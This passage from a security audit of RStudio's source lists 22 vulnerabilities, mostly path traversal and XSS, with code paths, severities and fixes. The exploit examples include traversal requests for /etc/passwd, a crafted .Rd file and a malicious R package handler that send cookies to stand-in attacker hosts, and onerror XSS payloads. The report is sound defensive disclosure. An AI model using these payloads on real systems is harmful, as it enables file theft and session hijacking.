| ID | Endpoint | Parameter | Source | Sink | Type | Severity |
|---|---|---|---|---|---|---|
| VULN-01 | `GET /content` | `file` (query) | `SessionContentUrls.cpp:99` | `:102` | Path Traversal — no containment check | **CRITICAL** |
| VULN-02 | `GET /themes/custom/local/*` | URI path | `SessionThemes.cpp:622` | `:624` | Path Traversal — symlink bypass | **HIGH** |
| VULN-03 | `GET /show/*` | URI path | `SessionFiles.cpp:637` | `:659` | Path Traversal — no guard (desktop) | **HIGH** |
| VULN-04 | `GET /html_preview/*` | URI path | `SessionHTMLPreview.cpp:964` | `setFile()` | Path Traversal — symlink bypass | **HIGH** |
| VULN-05 | `GET /tutorial/run` | `package`, `name` | `SessionTutorial.cpp:174` | `:177` | R param injection — no whitelist | **MEDIUM** |
| VULN-06 | Rmd Knit | `knit:` YAML field | `SessionRMarkdown.R:170` | `SessionRMarkdown.cpp:629` | R Code Injection — unescaped format | **MEDIUM** |
| VULN-07 | JSON-RPC `get_script_run_command` | `interpreter` | `SessionSource.cpp:1560` | `:1606` | R Code Injection — unescaped concat | **MEDIUM** |
| VULN-08 | Electron IPC `desktop_install_rtools` | `version`, `installerPath` | `gwt-callback.ts:975` | `:983` | OS Command Injection via `exec()` | **HIGH (Win)** |
| VULN-09 | `GET /files/<path>` | URI path (`%2e%2e`) | `SessionFiles.cpp:591` | `:607` | Path Traversal — encoding bypass | **HIGH** |
| VULN-10 | `GET /help/*` | `Referer` header | `SessionHelp.cpp:495` | `:497` | CRLF Injection — header injection | **HIGH** |
| VULN-11 | `GET /tutorial/*.png` | URI path | `SessionTutorial.cpp:337` | `:344` | Path Traversal — normalization escape | **HIGH** |
| VULN-12 | JSON-RPC `download_data_file` | `url` param | `SessionDataImport.R:40` | `:44` | SSRF — no URL validation | **MEDIUM** |

---

## 6. Third Pass — Additional Vulnerabilities (VULN-13 through VULN-22)

The following 10 additional vulnerabilities were discovered in a third deep-dive audit of the `src/` directory, including backend URI handlers, Electron IPC, and GWT frontend DOM sinks. All are new — not duplicating VULN-01 through VULN-12.

---

### VULN-13 — Direct Path Traversal: `/mathjax/` Handler (CRITICAL)

**Endpoint:** `GET /mathjax/<path>`
**Parameter:** URI path component (after `/mathjax/` prefix)
**Source:** `session/modules/mathjax/SessionMathJax.cpp:40`
**Sink:** `session/modules/mathjax/SessionMathJax.cpp:44` — `mathjaxPath.completePath(path)`
**Type:** Path Traversal — no cleanup, no containment, direct `..` traversal

#### Code Path

```cpp
// SessionMathJax.cpp:37-46
void handleMathJax(const http::Request& request, http::Response* pResponse)
{
   // Line 40 — path extracted directly from request.path() — NOT pathAfterPrefix()
   // request.path() returns the raw URI path — no cleanupPath() normalization
   std::string path = request.path().substr(strlen(kMathJaxURIPrefix));
   //                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //                 kMathJaxURIPrefix = "/mathjax/"
   //                 NO URL::cleanupPath() — ".." sequences survive unchanged

   // Line 44 — completePath() — NO containment check
   FilePath mathjaxPath = options().mathjaxPath();
   FilePath resourcePath = mathjaxPath.completePath(path);
   //                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //                      boost::filesystem::complete() — lexical join, no isWithin()

   pResponse->setCacheableFile(resourcePath, request);
}
```

#### Why This Is the Most Direct Path Traversal

Unlike other handlers that use `pathAfterPrefix()` (which calls `URL::cleanupPath()` to normalize `..` before processing), this handler uses `request.path()` directly. The raw `..` sequences pass through without any normalization or filtering. Combined with `completePath()` (which performs no containment check), this is a trivially exploitable path traversal.

Only 2 handlers in the entire codebase use `request.path()` directly: this one and a non-vulnerable read-only check in `SessionHelp.cpp:524`.

#### Exploit

```
GET /mathjax/../../../../../../etc/passwd HTTP/1.1
```

1. `request.path()` returns `/mathjax/../../../../../../etc/passwd`
2. `substr(strlen("/mathjax/"))` → `../../../../../../etc/passwd`
3. `mathjaxPath.completePath("../../../../../../etc/passwd")` → OS resolves `..` to `/etc/passwd`
4. `setCacheableFile()` returns file contents

No URL encoding tricks needed. No preconditions. Works as-is for any authenticated user.

**Impact:** Authenticated session → arbitrary file read. Any file readable by the rsession process user can be exfiltrated.

---

### VULN-14 — Path Traversal: `/chunk_output/` Handler (HIGH)

**Endpoint:** `GET /chunk_output/<ctx-id>/<doc-id>/<path...>`
**Parameter:** URI path components after ctx-id/doc-id
**Source:** `session/modules/rmarkdown/NotebookOutput.cpp:265-272`
**Sink:** `session/modules/rmarkdown/NotebookOutput.cpp:292` — `chunkCacheFolder().completePath(joined)`
**Type:** Path Traversal — URI split/join preserves `..`, `completePath()` has no guard

#### Code Path

```cpp
// NotebookOutput.cpp:259-293
Error handleChunkOutputRequest(const http::Request& request, http::Response* pResponse)
{
   // Line 265 — raw URI, no normalization
   std::string uri = request.uri();
   size_t idx = uri.find_last_of("?");
   if (idx != std::string::npos)
      uri = uri.substr(0, idx);

   // Line 272 — split on "/" — NO filtering of ".." parts
   std::vector<std::string> parts = algorithm::split(uri, "/");
   if (parts.size() < 5) return Success();

   std::string ctxId = parts[2];
   std::string docId = parts[3];
   for (int i = 0; i < 4; i++)
      parts.erase(parts.begin());
   // parts now contains remaining path components — can include ".."

   // Line 292 — joined parts passed to completePath() — NO containment check
   FilePath target = chunkCacheFolder(path, docId, ctxId).completePath(
      algorithm::join(parts, "/"));
   //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //  completePath() with ".." in joined path → directory traversal
}
```

#### Exploit

```
GET /chunk_output/saved/AAAAAAAA/../../../../../etc/passwd HTTP/1.1
```

1. URI split: `["", "chunk_output", "saved", "AAAAAAAA", "..", "..", "..", "..", "..", "etc", "passwd"]`
2. After erasing first 4: `["..", "..", "..", "..", "..", "etc", "passwd"]`
3. Joined: `"../../../../../etc/passwd"`
4. `chunkCacheFolder(...).completePath("../../../../../etc/passwd")` → OS resolves to `/etc/passwd`
5. File served via `setFile()` or `setIndefiniteCacheableFile()`

Note: `ctxId="saved"` and `docId` can be any string — the cache folder lookup may fail, but `completePath()` on the result still resolves relative paths from wherever the base path is.

**Impact:** Authenticated file read via notebook output handler.

---

### VULN-15 — URL-Encoded Path Traversal: `/quarto-preview.js` Handler (HIGH)

**Endpoint:** `GET /quarto-preview.js/<path>` (when Quarto is enabled)
**Parameter:** URI path component
**Source:** `session/modules/quarto/SessionQuartoResources.cpp:58`
**Sink:** `session/modules/quarto/SessionQuartoResources.cpp:63` — `previewPath.completePath(path)`
**Type:** Path Traversal — `pathAfterPrefix()` decode-after-cleanup bypass + `completePath()` no containment

#### Code Path

```cpp
// SessionQuartoResources.cpp:54-66
void handleQuartoPreview(const http::Request& request, http::Response* pResponse)
{
   // Line 58 — pathAfterPrefix calls cleanupPath THEN urlDecode
   std::string path = http::util::pathAfterPrefix(request, "/");
   //                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //  Step 1: URL::cleanupPath(request.uri()) — normalizes literal ".." but NOT "%2e%2e"
   //  Step 2: strip prefix "/"
   //  Step 3: urlDecode() — "%2e%2e" → ".."  (AFTER cleanup already ran!)

   // Line 63 — completePath() — NO containment check
   FilePath previewPath = FilePath(config.resources_path).completeChildPath("preview");
   FilePath filePath = previewPath.completePath(path);
   //                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //                  decoded ".." sequences → directory traversal

   pResponse->setCacheableFile(filePath, request);
}
```

#### Key Vulnerability: Decode After Cleanup

`pathAfterPrefix()` (`Util.cpp:389-406`) applies `URL::cleanupPath()` first (which normalizes literal `..` but not `%2e%2e`), then URL-decodes the result. The decoded `..` sequences reach `completePath()` with no further validation.

This is the same underlying decode-after-check pattern as VULN-09, but in a different handler.

#### Exploit

```
GET /quarto-preview.js/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

1. `cleanupPath()` sees `%2e%2e` (not literal `..`) — leaves unchanged
2. Strip prefix `/` → `quarto-preview.js/%2e%2e/%2e%2e/...`
3. `urlDecode()` → `quarto-preview.js/../../../../../etc/passwd`
4. `previewPath.completePath(decoded)` → OS resolves `..` to `/etc/passwd`

**Precondition:** Quarto must be enabled (`quartoConfig().enabled == true`). Handler is only registered when Quarto is configured.

**Impact:** Authenticated file read on systems with Quarto enabled.

---

### VULN-16 — URL-Encoded Path Traversal: `/rmd_output/` MathJax Sub-handler (HIGH)

**Endpoint:** `GET /rmd_output/<id>/mathjax/<path>`
**Parameter:** Path component after `mathjax` segment
**Source:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1400`
**Sink:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1422` — `mathJaxDirectory().completePath(sub_path)`
**Type:** Path Traversal — same decode-after-cleanup + `completePath()` pattern

#### Code Path

```cpp
// SessionRMarkdown.cpp:1417-1424
// After extracting and validating outputId from path prefix...
else if (boost::algorithm::starts_with(path, kMathjaxSegment))
{
   // kMathjaxSegment = "mathjax" (7 chars), sizeof = 8 (includes null)
   // path comes from pathAfterPrefix — decoded AFTER cleanupPath
   pResponse->setCacheableFile(
      mathJaxDirectory().completePath(
         path.substr(sizeof(kMathjaxSegment))),
   //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //  completePath() on decoded, un-normalized sub-path
                                 request);
}
```

#### Exploit

**Precondition:** User must have rendered at least one RMarkdown document so `s_renderOutputs[0]` is non-empty.

```
GET /rmd_output/0/mathjax/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

1. `pathAfterPrefix(request, "/rmd_output/")` → cleanup, strip prefix, decode
2. Decoded path: `0/mathjax/../../../../etc/passwd`
3. `outputId=0`, valid; `s_renderOutputs[0]` must be non-empty
4. Remaining: `mathjax/../../../../etc/passwd`
5. `starts_with("mathjax")` → true
6. `path.substr(8)` → `../../../etc/passwd` (after "mathjax/" is stripped)
7. `mathJaxDirectory().completePath("../../../etc/passwd")` → traversal

**Impact:** File read, gated by having rendered at least one RMarkdown document.

---

### VULN-17 — Out-of-Bounds Array Access: `/rmd_output/` Handler (MEDIUM)

**Endpoint:** `GET /rmd_output/<id>/<path>`
**Parameter:** `id` (integer from URI path)
**Source:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1382`
**Sink:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1391` — `s_renderOutputs[outputId]`
**Type:** Out-of-Bounds Read — unbounded vector subscript

#### Code Path

```cpp
// SessionRMarkdown.cpp:1379-1391
int outputId = 0;
try
{
   outputId = boost::lexical_cast<int>(path.substr(0, pos));
}
catch (boost::bad_lexical_cast const&)
{
   pResponse->setNotFoundError(request);
   return;
}

// NO BOUNDS CHECK before array access:
std::string outputFile = s_renderOutputs[outputId];
//                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
// s_renderOutputs is: std::vector<std::string>(kMaxRenderOutputs)
// kMaxRenderOutputs = 5 → valid indices: 0-4
// std::vector::operator[] does NOT throw on out-of-bounds
```

#### Vulnerability

`boost::lexical_cast<int>` can produce any integer value. `std::vector::operator[]` performs no bounds checking. For `outputId >= 5` or `outputId < 0`, this reads from memory outside the vector's data buffer — undefined behavior.

#### Exploit

```
GET /rmd_output/999/test.html HTTP/1.1
GET /rmd_output/-1/test.html HTTP/1.1
```

**Possible outcomes:**
- **Crash (segfault)** — if the out-of-bounds memory access triggers a page fault → session denial of service
- **Information leak** — if the OOB memory happens to contain a valid `std::string` pointing to a real file path, that file gets served
- **Silent failure** — if the OOB read produces an empty or invalid string, the handler returns 404

**Impact:** Denial of service (session crash). Potential information disclosure. Requires authenticated session.

---

### VULN-18 — Arbitrary .Rd File → HTML Conversion: `/help/preview` (MEDIUM)

**Endpoint:** `GET /help/preview?file=<path>`
**Parameter:** `file` (query string)
**Source:** `session/modules/SessionHelp.cpp:855`
**Sink:** `session/modules/SessionHelp.cpp:870-879` — `Rd2HTML(filePath) → setBody(html, text/html)`
**Type:** Reflected XSS via file conversion + Arbitrary file access

#### Code Path

```cpp
// SessionHelp.cpp:850-881
void handleRdPreviewRequest(const http::Request& request, ...)
{
   // Line 855 — file path from query parameter — URL-decoded
   std::string file = request.queryParamValue("file");

   // Line 863 — resolveAliasedPath resolves ~ but performs NO containment check
   FilePath filePath = module_context::resolveAliasedPath(file);
   if (!filePath.exists())
   {
      pResponse->setNotFoundError(request);
      return;
   }

   // Line 870 — converts ANY .Rd file to HTML
   std::string html;
   Error error = Rd2HTML(filePath, &html);

   // Line 877-879 — served as text/html with no CSP or sanitization
   pResponse->setContentType("text/html");
   pResponse->setNoCacheHeaders();
   pResponse->setBody(html, filter);
}
```

#### Two Attack Vectors

**Vector A — Arbitrary File Access:** The `file` parameter accepts any path. `resolveAliasedPath` resolves `~` to the home directory but performs no containment check. Any `.Rd` file readable by the session process can be converted to HTML and served:
```
GET /help/preview?file=/usr/lib/R/library/base/man/system.Rd
GET /help/preview?file=~/sensitive-project/internal.Rd
```

**Vector B — XSS via Crafted .Rd File:** The Rd format supports raw HTML output via `\if{html}{\out{...}}` directives. If an attacker places a crafted `.Rd` file on disk (e.g., in a shared project, git clone, or R package):

```
% malicious.Rd
\name{exploit}
\title{Exploit}
\description{
\if{html}{\out{<script>fetch('http://attacker.example.com/steal?cookie='+document.cookie)</script>}}
}
```

Then:
```
GET /help/preview?file=~/shared-project/man/malicious.Rd
```

The `Rd2HTML` converter preserves the raw HTML from `\if{html}{\out{...}}`. The response is `Content-Type: text/html` with no Content-Security-Policy header. The injected JavaScript executes in the RStudio session context.

**Impact:** XSS via crafted R documentation file. Accessible to authenticated users. Enables session hijacking, credential theft from RStudio session.

---

### VULN-19 — R httpd Arbitrary Header Injection via `/custom/` and `/help/` (MEDIUM)

**Endpoint:** `GET /custom/<handler>/<path>`, `GET /help/<path>`
**Parameter:** Headers returned by R httpd handler functions
**Source:** `session/modules/SessionHelp.cpp:457-459` — R httpd response headers
**Sink:** `session/modules/SessionHelp.cpp:473-475` — `setHeaderLine()` with no sanitization
**Type:** HTTP Header Injection via R Package httpd Handler

#### Code Path

```cpp
// SessionHelp.cpp:428-475
void handleHttpdResult(SEXP httpdSEXP, const http::Request& request, ...)
{
   // Line 451 — content type from R httpd response — any MIME type accepted
   contentType = CHAR(STRING_ELT(ctSEXP, 0));

   // Lines 457-459 — headers extracted from R httpd response
   SEXP headersSEXP = VECTOR_ELT(httpdSEXP, 2);
   if (TYPEOF(headersSEXP) == STRSXP)
      r::sexp::extract(headersSEXP, &headers);

   // Line 470 — arbitrary content type set
   pResponse->setContentType(contentType);

   // Lines 473-475 — EACH R httpd header is passed through setHeaderLine()
   // with NO CRLF sanitization and NO header name/value validation
   std::for_each(headers.begin(), headers.end(),
      boost::bind(&http::Response::setHeaderLine, pResponse, _1));
   //            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   //  setHeaderLine() parses "Name: Value" and calls setHeader()
   //  Message::setHeader() stores raw value — no CRLF check
}
```

#### Attack Vector

A malicious R package registers a custom httpd handler via `tools::startDynamicHelp()` or `.httpd.handlers.env`. When the handler is invoked via `/custom/<name>/`, it can:

1. **Set arbitrary Content-Type** to serve executable content (e.g., `text/html` with JavaScript)
2. **Inject arbitrary HTTP headers** including `Set-Cookie`, `Access-Control-Allow-Origin`, or CRLF-injected headers
3. **Control the response body** with attacker-controlled HTML/JavaScript

#### Exploit Scenario

```r
# Malicious R package installs this in .onLoad:
e <- tools:::.httpd.handlers.env
e[["backdoor"]] <- function(path, query, body, headers) {
  list(
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "text/html",
    c("X-Injected: yes", "Set-Cookie: pwned=1; Path=/"),
    200L
  )
}
```

Then: `GET /custom/backdoor/` → XSS + cookie injection

**Impact:** After installing a malicious R package, the attacker gains persistent XSS and header injection capability. The package only needs to be loaded once — the handler persists for the session duration.

---

### VULN-20 — DOM XSS Sink: `DomUtils.htmlToText()` (MEDIUM)

**Endpoint:** Frontend (GWT JavaScript running in browser)
**Parameter:** Any string passed to `htmlToText()` function
**Source:** Multiple callers across the GWT codebase
**Sink:** `core/client/dom/DomUtils.java:809` — `el.setInnerHTML(html)`
**Type:** DOM-Based XSS — HTML parsing with side-effect execution

#### Code Path

```java
// DomUtils.java:806-811
public static String htmlToText(String html)
{
   Element el = DOM.createSpan();
   el.setInnerHTML(html);     // ← HTML parsed by browser — event handlers execute
   return el.getInnerText();  // only text returned, but damage already done
}
```

#### Why This Is a DOM XSS Sink

The browser's HTML parser executes event handlers (`onerror`, `onload`, `onfocus`, etc.) during `innerHTML` assignment, even though the function only intends to extract text. If the `html` parameter contains:

```html
<img src=x onerror="fetch('http://attacker.example.com/?c='+document.cookie)">
```

The `onerror` handler fires immediately during `setInnerHTML()`, before `getInnerText()` is called.

#### Known Callers

- `AppCommand.java:410` — command label processing
- `PanmirrorCommandUI.java:83` — Panmirror/visual editor command labels
- `TextEditingTargetWidget.java:441, 1592, 1620` — source editor widget titles

If any of these callers pass content derived from user-controlled sources (file names, document titles, R object names), the XSS fires.

**Impact:** DOM XSS in the RStudio frontend. Severity depends on which callers pass attacker-controlled content. The sink itself is confirmed dangerous.

---

### VULN-21 — DOM XSS: Help Autocomplete Popup Raw HTML Display (HIGH)

**Endpoint:** Frontend autocomplete/help popup
**Parameter:** R help documentation HTML from server
**Source:** `views/help/model/HelpInfo.java:41-45` — `getHTML()` → `setInnerHTML()`
**Sink:** `views/console/shell/assist/HelpInfoPopupPanel.java:119, 157, 190, 221` — `new HTML(description)`
**Type:** DOM XSS via malicious R package documentation

#### Code Path — Data Extraction

```java
// HelpInfo.java:35-64
public final ParsedInfo parse(String defaultSignature)
{
   String html = getHTML();     // Raw HTML from R help system
   DivElement div = Document.get().createDivElement();
   div.setInnerHTML(html);      // Line 45: HTML parsed — event handlers fire here

   // Lines 62-64: Parse <dl> elements, extracting innerHTML of children
   parseDescriptionList(args, descriptionLists.getItem(i));
   // Inside parseDescriptionList, values are extracted via getInnerHTML()
   // These raw HTML values are stored in the args HashMap
}
```

#### Code Path — Rendering

```java
// HelpInfoPopupPanel.java:116-126 (displayHelp)
String description = help.getDescription();  // Raw HTML from HelpInfo parse
HTML htmlDesc = new HTML(description);       // Line 119: DOM XSS sink
//             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
//  GWT HTML widget renders raw HTML string into DOM — no escaping
vpanel_.add(htmlDesc);

// Line 157 (displayParameterHelp):
HTML htmlDesc = new HTML(description);  // Same — raw HTML, no escaping

// Line 190 (displayPackageHelp):
HTML htmlDesc = new HTML(help.getDescription());  // Same

// Line 221 (displayRoxygenHelp):
HTML contents = new HTML(description);  // Same
```

#### Attack Vector

1. Attacker creates a malicious R package with crafted help documentation:
```r
# In man/exploit.Rd:
\name{exploit}
\title{Exploit Function}
\description{
\if{html}{\out{<img src=x onerror="fetch('http://attacker/steal?c='+document.cookie)">}}
Normal description text.
}
\arguments{
  \item{x}{\if{html}{\out{<img src=x onerror="alert('XSS via parameter help')">}} The x parameter}
}
```

2. Victim installs the package and types `exploit(` in the R console
3. RStudio displays the autocomplete help popup
4. `HelpInfo.parse()` processes the help HTML → `setInnerHTML()` fires `onerror` (first XSS)
5. `HelpInfoPopupPanel.displayHelp()` creates `new HTML(description)` → second XSS execution
6. `displayParameterHelp()` creates `new HTML(arg_description)` → XSS on parameter hover

#### Impact

XSS in the RStudio frontend via malicious R package documentation. Fires automatically when the user types a function name from the malicious package in the console or editor. No user interaction beyond typing is required after package installation.

---

### VULN-22 — DOM XSS: Chat Update Error Message (MEDIUM)

**Endpoint:** Frontend Chat/AI assistant pane
**Parameter:** Error message from server response
**Source:** Server response `message` field
**Sink:** `views/chat/ChatPane.java:507` — `updateMessageLabel_.setHTML()`
**Type:** DOM XSS via server error message

#### Code Path

```java
// ChatPane.java:505-507
@Override
public void showUpdateError(String errorMessage)
{
   updateMessageLabel_.setHTML(constants_.chatUpdateFailed(errorMessage));
   //                 ^^^^^^^
   //  setHTML() renders raw HTML — no escaping
}
```

```properties
# ChatConstants_en.properties:16
chatUpdateFailed=Update failed: {0}
# GWT i18n substitution does NOT HTML-escape {0}
```

#### Attack Vector

The `errorMessage` parameter originates from a server JSON response. If the server response contains HTML (either due to a compromised server, MITM, or a reflected value), the error message is rendered as HTML:

```json
{"status": "error", "message": "<img src=x onerror='alert(document.cookie)'>"}
```

Result: `updateMessageLabel_.setHTML("Update failed: <img src=x onerror='alert(document.cookie)'>")`

The `<img>` tag is parsed by the browser, `onerror` fires, and the attacker's JavaScript executes.

**Impact:** DOM XSS in the Chat/AI assistant pane. Requires the error message to contain attacker-controlled content, which could occur via MITM or a compromised update server endpoint.

---

## 6. Third Pass — Finding Summary Table

| ID | Endpoint | Parameter | Source | Sink | Type | Severity |
|---|---|---|---|---|---|---|
| VULN-13 | `GET /mathjax/*` | URI path | `SessionMathJax.cpp:40` | `:44` | Path Traversal — direct `..`, no cleanup | **CRITICAL** |
| VULN-14 | `GET /chunk_output/*` | URI path | `NotebookOutput.cpp:272` | `:292` | Path Traversal — split/join preserves `..` | **HIGH** |
| VULN-15 | `GET /quarto-preview.js/*` | URI path (`%2e%2e`) | `SessionQuartoResources.cpp:58` | `:63` | Path Traversal — decode-after-cleanup | **HIGH** |
| VULN-16 | `GET /rmd_output/*/mathjax/*` | URI path (`%2e%2e`) | `SessionRMarkdown.cpp:1400` | `:1422` | Path Traversal — decode-after-cleanup | **HIGH** |
| VULN-17 | `GET /rmd_output/<id>/*` | `id` in path | `SessionRMarkdown.cpp:1382` | `:1391` | OOB Array Access — unbounded index | **MEDIUM** |
| VULN-18 | `GET /help/preview?file=` | `file` query | `SessionHelp.cpp:855` | `:870-879` | Arbitrary Rd → HTML + XSS | **MEDIUM** |
| VULN-19 | `GET /custom/*`, `/help/*` | R httpd headers | `SessionHelp.cpp:457` | `:473-475` | Header Injection via R httpd | **MEDIUM** |
| VULN-20 | Frontend | Strings in `htmlToText()` | `DomUtils.java:809` | `setInnerHTML()` | DOM XSS — parse side-effect | **MEDIUM** |
| VULN-21 | Frontend autocomplete | R help HTML | `HelpInfo.java:45` | `HelpInfoPopupPanel.java:119` | DOM XSS via malicious pkg help | **HIGH** |
| VULN-22 | Frontend chat pane | Server error msg | Server JSON | `ChatPane.java:507` | DOM XSS — unescaped `setHTML()` | **MEDIUM** |

---

## 7. Complete Vulnerability Summary — All 22 Findings

| ID | Endpoint | Type | Severity |
|---|---|---|---|
| VULN-01 | `GET /content?file=` | Path Traversal (completePath, no guard) | **CRITICAL** |
| VULN-02 | `GET /themes/custom/local/*` | Path Traversal (symlink bypass) | **HIGH** |
| VULN-03 | `GET /show/*` | Path Traversal (desktop: no guard; server: symlink) | **HIGH** |
| VULN-04 | `GET /html_preview/*` | Path Traversal (symlink bypass) | **HIGH** |
| VULN-05 | `GET /tutorial/run` | R Parameter Injection | **MEDIUM** |
| VULN-06 | Rmd Knit action | R Code Injection (knit: YAML) | **MEDIUM** |
| VULN-07 | JSON-RPC `get_script_run_command` | R Code Injection (interpreter concat) | **MEDIUM** |
| VULN-08 | Electron IPC `desktop_install_rtools` | OS Command Injection (exec) | **HIGH (Win)** |
| VULN-09 | `GET /files/%2e%2e/...` | Path Traversal (URL-encode bypass) | **HIGH** |
| VULN-10 | `GET /help/*` (302 redirect) | CRLF Injection (Referer → Location) | **HIGH** |
| VULN-11 | `GET /tutorial/*.png` | Path Traversal (normalization escape) | **HIGH** |
| VULN-12 | JSON-RPC `download_data_file` | SSRF (no URL validation) | **MEDIUM** |
| VULN-13 | `GET /mathjax/*` | Path Traversal (direct `..`, no cleanup) | **CRITICAL** |
| VULN-14 | `GET /chunk_output/*` | Path Traversal (split/join `..`) | **HIGH** |
| VULN-15 | `GET /quarto-preview.js/*` | Path Traversal (decode-after-cleanup) | **HIGH** |
| VULN-16 | `GET /rmd_output/*/mathjax/*` | Path Traversal (decode-after-cleanup) | **HIGH** |
| VULN-17 | `GET /rmd_output/<id>/*` | OOB Array Access | **MEDIUM** |
| VULN-18 | `GET /help/preview?file=` | Arbitrary Rd→HTML + XSS | **MEDIUM** |
| VULN-19 | `GET /custom/*`, `/help/*` | Header Injection via R httpd | **MEDIUM** |
| VULN-20 | Frontend `DomUtils.htmlToText()` | DOM XSS (parse side-effect) | **MEDIUM** |
| VULN-21 | Frontend autocomplete popup | DOM XSS (malicious pkg help) | **HIGH** |
| VULN-22 | Frontend chat pane | DOM XSS (unescaped error msg) | **MEDIUM** |

---

## 8. Recommendations

### P0 — Critical / Immediate Fixes

| Fix | Vuln |
|---|---|
| **Replace `completePath()` with `completeChildPath()`** in `SessionMathJax.cpp:44` (handleMathJax). This is the most trivially exploitable path traversal — no encoding tricks needed, no preconditions. | VULN-13 |
| **Replace `completePath()` with `completeChildPath()`** in `SessionContentUrls.cpp:102` (contentFileInfo). | VULN-01 |
| **Replace `completePath()` with `completeChildPath()`** in `NotebookOutput.cpp:292,303` (handleChunkOutputRequest). Also add `..` filtering to the split parts before reassembly. | VULN-14 |
| **Replace `completePath()` with `completeChildPath()`** in `SessionQuartoResources.cpp:63` (handleQuartoPreview). | VULN-15 |
| In `handleFilesRequest()`, URL-decode the URI **before** checking for `..`, or use `pathAfterPrefix()` which applies `cleanupPath()` first. | VULN-09 |

### P1 — High Priority

| Fix | Vuln |
|---|---|
| In `handleTutorialFileRequest()`, replace `completePath(path)` with `completeChildPath(path)`. Reject absolute paths. | VULN-11 |
| **Replace `completePath()` with `completeChildPath()`** in `SessionRMarkdown.cpp:1422` (mathjax sub-handler). | VULN-16 |
| **Add bounds check** before `s_renderOutputs[outputId]` at `SessionRMarkdown.cpp:1391`: reject `outputId < 0 || outputId >= kMaxRenderOutputs`. | VULN-17 |
| In `handleHttpdResult()`, replace the direct `setHeader("Location", redirect)` call with `setMovedTemporarily(request, ...)`, or apply `safeLocation()` to the Referer-derived value. | VULN-10 |
| **Sanitize R httpd headers** in `handleHttpdResult()` lines 473-475. Validate each header line from R httpd: strip CRLF, reject headers with disallowed names (e.g., `Set-Cookie`, `Content-Length`). | VULN-19 |
| Update `isWithin()` to use `boost::filesystem::weakly_canonical()` or POSIX `realpath()` to eliminate symlink bypass. | VULN-02/03/04 |
| Replace `exec(command_string)` with `execFile(binary, [args])` in `gwt-callback.ts:983` to prevent shell interpretation. | VULN-08 |
| In `HelpInfoPopupPanel.java`, replace `new HTML(description)` with `new HTML(SafeHtmlUtils.fromString(description))` or use a SafeHtml builder at lines 119, 157, 190, 221. | VULN-21 |

### P2 — Medium Priority

| Fix | Vuln |
|---|---|
| In `handleRdPreviewRequest()`, add path containment check: verify `filePath.isWithin()` for allowed directories (home dir, R library paths). | VULN-18 |
| In `ChatPane.java:507`, use `updateMessageLabel_.setText()` instead of `setHTML()`, or escape the error message with `SafeHtmlUtils.htmlEscape()`. | VULN-22 |
| In `DomUtils.htmlToText()`, replace `setInnerHTML(html)` with a text-only extraction method, or sanitize input HTML by stripping event handlers before parsing. | VULN-20 |
| Add URL validation to `download_data_file`: reject non-`http(s)://` schemes, block RFC1918/loopback/link-local ranges. | VULN-12 |
| Apply `singleQuotedStrEscape()` to `renderFunc` at `SessionRMarkdown.cpp:629`. | VULN-06 |
| Escape `interpreter` for double-quoted R string context in `getScriptRunCommand()`. | VULN-07 |

### P3 — Low Priority

| Fix | Vuln |
|---|---|
| Validate `package` parameter against `find.packages()` output in `handleTutorialRunRequest()`. | VULN-05 |

### Architectural Recommendations

1. **Global `completePath()` audit:** Search all uses of `completePath()` and replace with `completeChildPath()` unless there is a specific reason to allow unconstrained path resolution. There are currently at least 7 handlers using the unsafe variant.

2. **Fix `pathAfterPrefix()` decode ordering:** In `Util.cpp:389-406`, move `urlDecode()` before `cleanupPath()`, or apply `cleanupPath()` to the decoded result. The current decode-after-cleanup ordering is the root cause of VULN-09, VULN-15, and VULN-16.

3. **Symlink-safe `isWithin()`:** Replace `getLexicallyNormalPath()` with `weakly_canonical()` in the `isWithin()` implementation to prevent symlink-based escapes.

4. **Frontend HTML sanitization layer:** Create a centralized sanitization utility for all server-provided HTML content. Replace direct `new HTML(string)` and `setInnerHTML(string)` calls with a sanitizer-gated equivalent.

5. **Content-Security-Policy headers:** Add CSP headers to all HTML-serving endpoints to mitigate the impact of XSS vulnerabilities.

---

## 4. Fourth-Pass Audit: Non-Path-Traversal GET/Query-Parameter Vulnerabilities

**Scope:** Exhaustive audit of GET / query-parameter attack surface, EXCLUDING path traversal (already covered above) and all duplicates of VULN-01–VULN-22.

**Methodology:**
- Phase 1: Mapped every `queryParamValue()`, `queryParams()`, `parseQueryString()`, `Window.Location.getParameter()`, and IPC handler across the entire `src/` tree.
- Phase 2: Traced source→transform→sink dataflows for each parameter to non-filesystem sinks (protocol handlers, window loaders, headers, SQL, eval, redirects).
- Phase 3: Verified each finding manually by reading source code and tracing control flow.
- Phase 4: Compiled hardening recommendations.

### Executive Summary

This pass focused on non-path-traversal injection classes: arbitrary protocol handler execution, trusted-window URL injection, clipboard exfiltration, session initialization override, HTTP parameter pollution, and navigation whitelist poisoning. Six new vulnerabilities were identified (VULN-23 through VULN-28), all with concrete code evidence. The most critical findings affect the Electron desktop application's IPC layer, where multiple handlers accept unvalidated URLs from the renderer process.

---

### Phase 1 — Endpoint & Parameter Inventory (GET/Query-Param Entry Points)

| Entry Point | Parameter(s) | Technology | Source File |
|---|---|---|---|
| `queryParamValue(kAppUri)` | `appUri` | C++ HTTP | `ServerLoginPages.cpp:80`, `ServerAuthCommon.cpp:103,236` |
| `queryParamValue("view")` | `view` | C++ HTTP | `SessionSynctex.cpp:296` |
| `queryParams()` → R httpd dispatch | All query params | C++ → R | `SessionHelp.cpp:701` |
